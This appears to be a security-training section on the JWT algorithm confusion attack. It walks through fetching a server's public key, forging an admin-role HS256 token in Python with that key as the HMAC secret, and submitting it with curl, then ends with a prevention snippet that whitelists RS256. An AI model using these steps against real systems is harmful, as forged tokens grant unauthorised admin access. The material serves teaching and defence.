# 3.1 Algorithm Confusion

## Goal

Switch from asymmetric (RS256) to symmetric (HS256), using server's PUBLIC key as HMAC secret to forge tokens.

---

## The Vulnerability

```
Server implementation:
- Uses RS256 (private key signs, public key verifies)

Attacker thinks:
- "I can't use public key to sign RS256 tokens"

But what if:
- Attacker uses HS256 (same secret signs and verifies)
- Uses public key as HMAC secret!
- Server validates with same public key
- Signature matches = ACCEPTED!
```

---

## Why It Works

```
RS256: Private key signs → Public key verifies
HS256: Secret signs → Secret verifies

If server doesn't validate algorithm:
- Server expects: RS256 signature validated with public key
- Attacker sends: HS256 signature created with public key as secret
- Server validates: HMAC(public_key, payload) = signature
- Matches! = ACCEPTED
```

---

## Exploitation Steps

### Step 1: Obtain Server's Public Key

Usually publicly available:
- `/.well-known/jwks.json`
- `/certs.pem`
- X.509 certificate
- Error messages

```bash
# Download public key
curl https://target.com/.well-known/jwks.json > keys.json

# Or extract from certificate
openssl x509 -in cert.pem -pubkey -noout > public.pem
```

### Step 2: Create Token with HS256

```python
import jwt

# Server's public key as string
public_key_content = open('public.pem').read()

payload = {
    "role": "admin",
    "sub": "123"
}

# Sign with HS256 using PUBLIC key as secret!
token = jwt.encode(
    payload,
    public_key_content,  # Public key as HMAC secret
    algorithm="HS256"
)

print(token)
```

### Step 3: Modify Header to HS256

Token header should be:
```json
{"alg":"HS256","typ":"JWT"}
```

(Automatically set by jwt_tool if using HS256)

### Step 4: Submit Token

```bash
curl -H "Authorization: Bearer TOKEN" \
     https://api.target.com/admin
```

### Step 5: Server Validates

```
Server receives HS256 token
Server: "I expect RS256, but I'll try to validate"
Server uses public key to verify HS256 signature
Signature valid! = ACCEPTED
```

## Real-World Scenario

**Target:** Enterprise API with RS256

**Public Key (publicly available):**
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGc9jcsQ...

```

**Attack:**
1. Copy public key
2. Create HS256 token with public key as secret
3. Modify alg to "HS256"
4. Sign token (attacker knows "secret" = public key)
5. Submit to server
6. Server validates with public key
7. Signature matches (attacker created it with public key!)
8. Token accepted = FULL COMPROMISE

## Why It Bypasses

```
Code: 
Algorithm_list = ['RS256', 'HS256']
key = public_key
jwt.verify(token, key, algorithms=algorithm_list)

Problem: 
- Accepts any algorithm in list
- Doesn't check which one was used
- Attacker picks HS256
- Uses public key as HMAC secret
- Works!
```

## Prevention

```php
// WRONG: Accept any algorithm
$decoded = JWT::decode($token, $public_key);

// CORRECT: Whitelist algorithm
$decoded = JWT::decode(
    $token,
    $public_key,
    ['RS256']  // Only RS256 allowed!
);
```
